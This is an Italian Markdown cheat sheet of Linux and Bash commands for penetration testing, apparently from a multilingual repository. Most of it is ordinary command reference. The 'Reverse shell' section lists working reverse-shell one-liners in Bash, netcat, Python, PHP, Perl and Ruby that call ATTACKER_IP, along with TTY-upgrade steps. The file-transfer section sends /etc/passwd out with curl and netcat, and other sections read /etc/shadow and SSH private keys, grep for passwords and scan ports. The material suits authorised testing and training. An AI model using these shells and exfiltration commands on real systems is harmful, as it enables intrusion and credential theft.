# 🐧 Comandi Linux e Bash - Scheda completa per il penetration testing

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

> **Nota sugli esempi:** disponibilità di `ll`, strumenti di rete legacy e opzioni di Netcat dipendono dalla distribuzione; Python 2 è un riferimento storico. I frammenti di condizioni Bash mostrano singoli test, non uno script completo con tutti i `fi`. Negli esempi Base64, `echo` aggiunge una nuova riga. La regex IPv4 estrae anche ottetti fuori dall’intervallo valido. La decodifica URL mostrata con `xxd -r -p` non gestisce direttamente i separatori `%` e non è un decoder URL generale. I comandi vengono conservati come nell’originale, compresi quelli che modificano file o configurazioni.

---

## 📋 Indice

- [Navigazione e file](#-navigazione-e-file)
- [Enumerazione del sistema](#-enumerazione-del-sistema)
- [Enumerazione degli utenti](#-enumerazione-degli-utenti)
- [Comandi di rete](#-comandi-di-rete)
- [Ricerca e analisi dei file](#-ricerca-e-analisi-dei-file)
- [Elaborazione del testo](#-elaborazione-del-testo)
- [Permessi e proprietà](#-permessi-e-proprietà)
- [Gestione dei processi](#-gestione-dei-processi)
- [Gestione dei pacchetti](#-gestione-dei-pacchetti)
- [Scripting Bash](#-scripting-bash)
- [Reverse shell](#-reverse-shell)
- [Trasferimento di file](#-trasferimento-di-file)
- [Comandi su una sola riga](#-comandi-su-una-sola-riga)

---

## 📁 Navigazione e file

### Navigazione tra le directory

```bash
# Directory corrente
pwd

# Cambia directory
cd /path/to/dir
cd ..          # Directory superiore
cd ~           # Directory home
cd -           # Directory precedente

# Elenca i file
ls
ls -la         # Formato lungo, tutti i file
ls -lah        # Dimensioni leggibili
ls -latr       # Ordina per data in ordine inverso
ll             # Alias di ls -la (in molte distribuzioni)
```

### Operazioni sui file

```bash
# Crea file e directory
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # Crea le directory superiori

# Copia
cp source dest
cp -r source_dir dest_dir  # Ricorsivamente

# Sposta o rinomina
mv source dest
mv oldname newname

# Elimina
rm file
rm -r directory            # Ricorsivamente
rm -rf directory           # Forza, senza richiesta di conferma

# Visualizza i file
cat file.txt
less file.txt              # Visualizzatore a pagine
more file.txt
head -n 20 file.txt        # Prime 20 righe
tail -n 20 file.txt        # Ultime 20 righe
tail -f file.txt           # Segui gli aggiornamenti in tempo reale
```

### Archivi e compressione

```bash
# tar
tar -cvf archive.tar files/      # Crea
tar -xvf archive.tar             # Estrai
tar -czvf archive.tar.gz files/  # Crea con compressione gzip
tar -xzvf archive.tar.gz         # Estrai un archivio gzip

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

## 🔍 Enumerazione del sistema

### Informazioni sul sistema

```bash
# Nome host
hostname
hostname -I               # Indirizzi IP

# Sistema operativo e kernel
uname -a                  # Tutte le informazioni
uname -r                  # Versione del kernel
cat /etc/os-release       # Informazioni sul sistema operativo
cat /etc/issue            # Banner del sistema operativo
cat /proc/version         # Informazioni sul kernel e sul compilatore

# Architettura
arch
uname -m

# Hardware
lscpu                     # Informazioni sulla CPU
cat /proc/cpuinfo
free -h                   # Memoria
df -h                     # Spazio su disco
lsblk                     # Dispositivi a blocchi
```

### Ambiente

```bash
# Variabili d'ambiente
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Imposta una variabile
export VAR="value"
VAR="value"
```

### Servizi in esecuzione

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# Verifica le porte in ascolto
ss -tulpn
netstat -tulpn
```

### Attività cron

```bash
# Crontab dell'utente
crontab -l

# Crontab di sistema
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Osserva le attività cron (con pspy)
./pspy64
```

### Pacchetti installati

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# Trova un pacchetto
dpkg -l | grep package
which binary
whereis binary
```

---

## 👤 Enumerazione degli utenti

### Utente corrente

```bash
# Identità corrente
whoami
id
id username

# Gruppi
groups
groups username

# Privilegi
sudo -l                   # Autorizzazioni sudo
cat /etc/sudoers          # File sudoers (richiede root)
```

### Tutti gli utenti

```bash
# Elenco degli utenti
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Utenti con una shell
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# Hash delle password (richiede root)
cat /etc/shadow

# Accessi recenti
last
lastlog
w
who
users
```

### File interessanti

```bash
# Chiavi SSH
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Cronologia
cat ~/.bash_history
cat ~/.zsh_history
history

# File di configurazione
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

## 🌐 Comandi di rete

### Configurazione di rete

```bash
# Indirizzo IP
ip a
ip addr show
ifconfig

# Rotte
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# Tabella ARP
arp -a
ip neigh
```

### Porte aperte e connessioni

```bash
# Porte in ascolto
ss -tulpn
ss -tlnp                  # Soltanto TCP
netstat -tulpn
netstat -ano

# Connessioni attive
ss -tup
netstat -an | grep ESTABLISHED

# Individua il processo tramite la porta
lsof -i :80
fuser 80/tcp
```

### Test di rete

```bash
# Ping
ping -c 4 host

# Tracciamento del percorso di rete
traceroute host
tracepath host

# Ricerca DNS
host domain.com
dig domain.com
nslookup domain.com

# Verifica della porta
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # Soltanto le intestazioni
curl -s http://host       # Silenzioso
curl -k https://host      # Ignora la verifica SSL
wget http://host/file
```

### Firewall

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS)
firewall-cmd --list-all
```

---

## 🔎 Ricerca e analisi dei file

### Comando find

```bash
# Trova per nome
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # Senza distinzione tra maiuscole e minuscole

# Trova per tipo
find / -type f -name "*.conf"          # File
find / -type d -name "backup"          # Directory

# Trova per permessi
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # Scrivibile da chiunque

# Trova per proprietario
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# Trova per dimensione
find / -size +100M 2>/dev/null         # Più grande di 100MB
find / -size -1k 2>/dev/null           # Più piccolo di 1KB

# Trova per data
find / -mtime -7 2>/dev/null           # Modificato negli ultimi 7 giorni
find / -atime +30 2>/dev/null          # Ultimo accesso più di 30 giorni fa

# Trova ed esegui
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

### Grep (ricerca nei file)

```bash
# Ricerca di base
grep "pattern" file
grep -i "pattern" file                 # Senza distinzione tra maiuscole e minuscole
grep -r "pattern" /path/               # Ricorsivamente
grep -rn "pattern" /path/              # Con numeri di riga

# Corrispondenza inversa
grep -v "pattern" file                 # Righe che NON corrispondono

# Conta le corrispondenze
grep -c "pattern" file

# Mostra il contesto
grep -A 3 "pattern" file               # 3 righe successive
grep -B 3 "pattern" file               # 3 righe precedenti
grep -C 3 "pattern" file               # 3 righe prima e dopo

# Espressione regolare
grep -E "regex" file                   # Espressione regolare estesa
egrep "regex" file

# Più schemi
grep -E "pattern1|pattern2" file
```

### Locate e Which

```bash
# Locate (richiede updatedb)
locate filename
updatedb                               # Aggiorna il database

# Which (trova il binario)
which binary
whereis binary
type command
```

### Analisi dei file

```bash
# Tipo del file
file filename

# Stringhe nel binario
strings binary
strings binary | grep password

# Visualizzazione esadecimale
xxd file
hexdump -C file

# Hash
md5sum file
sha256sum file
sha1sum file
```

---

## ✂ Elaborazione del testo

### Cut

```bash
# Suddividi per delimitatore
cut -d: -f1 /etc/passwd                # Primo campo, delimitatore :
cut -d: -f1,3 /etc/passwd              # Campi 1 e 3

# Estrai per posizione dei caratteri
cut -c1-10 file                        # Caratteri 1-10
```

### Awk

```bash
# Stampa le colonne
awk '{print $1}' file                  # Prima colonna
awk '{print $1, $3}' file              # Colonne 1 e 3
awk -F: '{print $1}' /etc/passwd       # Delimitatore personalizzato

# Condizioni
awk '$3 > 1000' /etc/passwd            # Dove il campo 3 > 1000
awk '/pattern/ {print $1}' file        # Righe corrispondenti

# Variabili integrate
awk '{print NR, $0}' file              # Numeri di riga
awk 'END {print NR}' file              # Righe totali
```

### Sed

```bash
# Sostituisci
sed 's/old/new/' file                  # Prima occorrenza
sed 's/old/new/g' file                 # Tutte le occorrenze
sed -i 's/old/new/g' file              # Modifica direttamente il file

# Elimina le righe
sed '/pattern/d' file                  # Elimina quelle corrispondenti
sed '5d' file                          # Elimina la riga 5
sed '1,5d' file                        # Elimina le righe 1-5

# Stampa righe specifiche
sed -n '5p' file                       # Stampa la riga 5
sed -n '1,10p' file                    # Stampa le righe 1-10
```

### Sort e Uniq

```bash
# Ordina
sort file
sort -r file                           # Ordine inverso
sort -n file                           # Numerico
sort -u file                           # Soltanto valori univoci
sort -t: -k3 -n /etc/passwd            # Per il campo 3

# Valori univoci
uniq file                              # Rimuovi i duplicati adiacenti
sort file | uniq                       # Rimuovi tutti i duplicati
uniq -c file                           # Conta le occorrenze
sort file | uniq -c | sort -rn         # Conta e ordina
```

### Altri comandi utili

```bash
# Conteggio delle parole
wc -l file                             # Righe
wc -w file                             # Parole
wc -c file                             # Byte

# Formattazione delle colonne
column -t file                         # Disponi in tabella
column -s: -t /etc/passwd              # Separatore personalizzato

# tr (trasformazione dei caratteri)
echo "HELLO" | tr 'A-Z' 'a-z'          # Minuscole
cat file | tr -d '\n'                  # Rimuovi i caratteri di nuova riga

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

## 🔐 Permessi e proprietà

### Comprendere i permessi

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Altri (r-x = 5)
│ │  └───── Gruppo (r-x = 5)
│ └──────── Proprietario (rwx = 7)
└────────── Tipo di file (- = file, d = directory)
```

### Chmod

```bash
# Numerico
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# Notazione simbolica
chmod +x file                          # Aggiungi il permesso di esecuzione
chmod -w file                          # Rimuovi il permesso di scrittura
chmod u+x file                         # Esecuzione per il proprietario
chmod g+w file                         # Scrittura per il gruppo
chmod o-r file                         # Nessuna lettura per gli altri

# Ricorsivamente
chmod -R 755 directory/
```

### Chown

```bash
# Cambia il proprietario
chown user file
chown user:group file
chown -R user:group directory/

# Cambia soltanto il gruppo
chgrp group file
```

### Permessi speciali

```bash
# SUID (Set User ID) - 4
chmod u+s file
chmod 4755 file

# SGID (Set Group ID) - 2
chmod g+s directory
chmod 2755 directory

# Sticky bit - 1
chmod +t directory
chmod 1755 directory

# Trova SUID/SGID
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

## ⚙ Gestione dei processi

### Visualizzazione dei processi

```bash
# Elenca i processi
ps aux
ps -ef
ps aux | grep process_name

# Top (in tempo reale)
top
htop                                   # Versione più completa

# Albero dei processi
pstree
ps auxf
```

### Controllo dei processi

```bash
# Background e primo piano
command &                              # Esegui in background
Ctrl+Z                                 # Sospendi
bg                                     # Riprendi in background
fg                                     # Porta in primo piano
jobs                                   # Elenca i job

# Termina il processo
kill PID
kill -9 PID                            # Termina forzatamente
killall process_name
pkill process_name

# Nice (priorità)
nice -n 10 command                     # Priorità inferiore
renice 10 -p PID
```

---

## 📦 Gestione dei pacchetti

### Debian/Ubuntu (apt/dpkg)

```bash
# Aggiorna
apt update
apt upgrade

# Installa
apt install package
dpkg -i package.deb

# Rimuovi
apt remove package
apt purge package                      # Rimuovi anche la configurazione

# Cerca
apt search package
apt-cache search package

# Informazioni
apt show package
dpkg -l | grep package
```

### RHEL/CentOS (yum/dnf)

```bash
# Aggiorna
yum update
dnf update

# Installa
yum install package
dnf install package

# Rimuovi
yum remove package

# Cerca
yum search package

# Informazioni
yum info package
rpm -qa | grep package
```

---

## 💻 Scripting Bash

### Fondamenti

```bash
#!/bin/bash

# Variabili
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# Sostituzione dei comandi
DATE=$(date)
FILES=`ls -la`

# Leggi l'input
read -p "Enter name: " NAME
echo "Hello $NAME"
```

### Condizioni

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# Confronti tra stringhe
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # Vuoto
if [ -n "$str" ]; then                 # Non vuoto

# Confronti tra numeri
if [ $num1 -eq $num2 ]; then           # Uguale
if [ $num1 -ne $num2 ]; then           # Diverso
if [ $num1 -gt $num2 ]; then           # Maggiore di
if [ $num1 -lt $num2 ]; then           # Minore di

# Verifiche sui file
if [ -e file ]; then                   # Esiste
if [ -f file ]; then                   # È un file
if [ -d dir ]; then                    # È una directory
if [ -r file ]; then                   # Leggibile
if [ -w file ]; then                   # Scrivibile
if [ -x file ]; then                   # Eseguibile
```

### Cicli

```bash
# Ciclo for
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# Ciclo while
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# for in stile C
for ((i=0; i<10; i++)); do
    echo $i
done
```

### Funzioni

```bash
# Definisci la funzione
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# Richiama la funzione
function_name arg1 arg2
```

### Esempio di script

```bash
#!/bin/bash
# Scanner delle porte

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

## 🔌 Reverse shell

### Bash

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### Netcat

```bash
# nc con -e
nc -e /bin/bash ATTACKER_IP PORT

# nc senza -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Miglioramento della shell

```bash
# Avvia una TTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# TTY completa
# Nella reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# Sul sistema del tester:
stty raw -echo; fg
# Nella shell:
export TERM=xterm
stty rows 40 cols 150
```

---

## ⬇ Trasferimento di file

### Dal sistema del tester al bersaglio

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# Sul sistema del tester: nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64 (per file piccoli)
# Sul sistema del tester: base64 file
echo "BASE64_STRING" | base64 -d > file
```

### Dal bersaglio al sistema del tester

```bash
# nc
# Sul sistema del tester: nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl (POST)
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# Copia l'output sul sistema del tester e decodificalo
```

### Avvia un server HTTP

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

## ⚡ Comandi su una sola riga

### Comandi utili per il pentest su una sola riga

```bash
# Trova i binari SUID
find / -perm -4000 -type f 2>/dev/null

# Trova le directory scrivibili
find / -writable -type d 2>/dev/null

# Trova i file scrivibili da chiunque
find / -perm -o+w -type f 2>/dev/null

# Trova i file di configurazione con password
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# Trova le chiavi SSH
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Scansione rapida delle porte
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Ricerca degli host tramite ping (ping sweep)
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# Estrai gli IP dal file
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Codifica e decodifica Base64
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# Codifica e decodifica URL
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

### Tabella di riferimento rapido

| Scopo | Comando |
|---------|---------|
| Utente corrente | `whoami` / `id` |
| Informazioni sul sistema | `uname -a` |
| Indirizzo IP | `ip a` / `hostname -I` |
| Porte aperte | `ss -tulpn` |
| Processi in esecuzione | `ps aux` |
| Trova SUID | `find / -perm -4000 2>/dev/null` |
| Directory scrivibili | `find / -writable -type d 2>/dev/null` |
| Scarica il file | `wget http://url/file` |
| Reverse shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Migliora la TTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

## 📚 Risorse

- [GTFOBins](https://gtfobins.github.io/)
- [Linux su HackTricks](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Scheda sulle reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Schede di riferimento correlate
- [Escalation dei privilegi Linux](../../Linux-PrivEsc/README.md)
- [Nmap](../../Nmap/translations/README.it.md)
- [Metasploit](../../Metasploit/translations/README.it.md)

---

<p align="center">
  <b>🐧 Padroneggia Linux per il penetration testing!</b><br>
  <i>La riga di comando è la tua migliore alleata</i>
</p>
